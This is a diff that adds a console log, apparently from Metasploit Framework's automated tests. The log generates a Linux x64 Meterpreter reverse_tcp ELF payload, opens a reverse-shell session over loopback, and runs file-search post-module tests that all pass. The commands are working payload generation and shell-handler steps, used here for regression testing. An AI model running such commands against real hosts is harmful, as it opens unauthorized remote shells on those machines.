@@ -1,0 +1,43 @@
+use linux/x64/meterpreter/reverse_tcp
+Stopping all jobs...
+[4mmsf6[0m post([1m[31mtest/get_env[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/tmp/linuxx64meterpreterreverse_tcp_session_tlv_logging20240125-2889-29t8pytxt
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> generate -o /tmp/child-process-rb-linux-x---meterpreter-reverse-tcp20240125-2889-a5fl4m -f elf AutoVerifySessionTimeout=30 lport=6004 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/linuxx64meterpreterreverse_tcp_debug_log20240125-2889-8bfex7txt MeterpreterTryToFork=false MeterpreterDebugBuild=true
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> SessionTlvLogging => file:/tmp/linuxx64meterpreterreverse_tcp_session_tlv_logging20240125-2889-29t8pytxt
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> [*] Writing 250 bytes to /tmp/child-process-rb-linux-x---meterpreter-reverse-tcp20240125-2889-a5fl4m...
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 3
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6004 
+[*] Sending stage (3045380 bytes) to 127.0.0.1
+[*] Meterpreter session 4 opened (127.0.0.1:6004 -> 127.0.0.1:60328) at 2024-01-25 19:34:22 +0000
+use test/search
+[4mmsf6[0m post([1m[31mtest/search[0m) [0m> run session=4 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to tmp: /tmp
+[*] Setup: Creating clean directory
+[*] Creating directory meterpreter-test-dir-pmuhbsyr
+[*] meterpreter-test-dir-pmuhbsyr created
+[*] Setup: Now in /tmp/meterpreter-test-dir-pmuhbsyr
+[*] Source File Name: meterpreter-test-pryshlzo.txt
+[*] Running against session 4
+[*] Session type is meterpreter and platform is linux
+[*] Starting search tests
+[+] should search for new files
+[+] should search recursively for files
+[+] should search with globs for files
+[+] should search with globs ignoring files
+[*] Starting search date tests
+[+] should search with dates for files
+[+] should search with dates ignores new files
+[+] should search with dates ignores old files
+[+] should search with date inclusive of exact date
+[*] Testing complete in 0.22 seconds
+[*] Passed: 8; Failed: 0; Skipped: 0
+[*] Cleanup: changing working directory back to /home/runner/work/metasploit-framework/metasploit-framework
+[*] Post module execution completed
+sessions -K
+[4mmsf6[0m post([1m[31mtest/search[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 4 closed.
+[4mmsf6[0m post([1m[31mtest/search[0m) [0m> 
